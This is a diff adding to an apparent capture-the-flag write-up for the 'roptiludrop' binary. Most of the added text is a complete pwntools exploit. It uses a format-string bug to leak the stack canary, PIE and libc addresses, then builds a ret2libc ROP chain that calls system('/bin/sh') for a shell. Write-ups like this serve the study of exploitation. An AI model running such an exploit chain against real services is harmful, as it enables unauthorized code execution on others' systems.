@@ -169,3 +169,103 @@ From the fuzz script I can tell it's at offset 9 also we can confirm it with usi
 
 That's confirmed that our canary offset is at 9 
 
+Well with this set we can just use a ROP technique called Ret2Libc 
+
+Here's my script used to solve it locally
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+import warnings
+import re
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+piebase
+break *life+25
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './roptiludrop'
+elf = context.binary = ELF(exe, checksec=False) 
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+libc = elf.libc
+
+# Leak stack canary address & pie address
+stack_canary = '%9$p'
+pie_leak = '%15$p'
+# pie_leak = '%17$p'
+io.sendline(stack_canary.encode() + b' ' + pie_leak.encode())
+
+# Extract the two addresses from the response
+io.recvline()
+leak = io.recvline().strip().split(b'What')
+hex_values = []
+for item in leak:
+    hex_matches = re.findall(r'0x[\da-fA-F]+', item.decode())
+    hex_values.extend(hex_matches)
+
+canary = int(hex_values[0], 16)
+leakedpie = int(hex_values[1], 16)
+printf = int(hex_values[2], 16)
+info("Canary address: %#x", canary)
+info("Leaked Pie address: %#x", leakedpie)
+info("Leaked printf address: %#x", printf)
+
+# Calculate pie base address
+elf.address = leakedpie - elf.symbols['main']
+info("Piebase address: %#x", elf.address)
+
+# Calculate base address
+libc.address =  printf - libc.symbols['printf']
+info("Libc base address %#x", libc.address)
+
+# Send the exploit 
+offset = 24 # overwrite the canary
+padding = 8 
+ret = 0x101a # 0x000000000000101a: ret; 
+movaps = ret + elf.address # allign the stack 
+pop_rdi = elf.address + 0x13b3
+sh = next(libc.search(b'/bin/sh'))
+system = libc.symbols['system']
+info("System address found %#x", libc.symbols['system'])
+info("/bin/sh address: %#x", sh)
+
+payload = flat({
+    offset: [
+        canary,
+        padding,
+        pop_rdi,
+        sh,
+        movaps,
+        system
+        
+    ]
+})
+
+io.sendline(payload)
+
+io.interactive()
+```
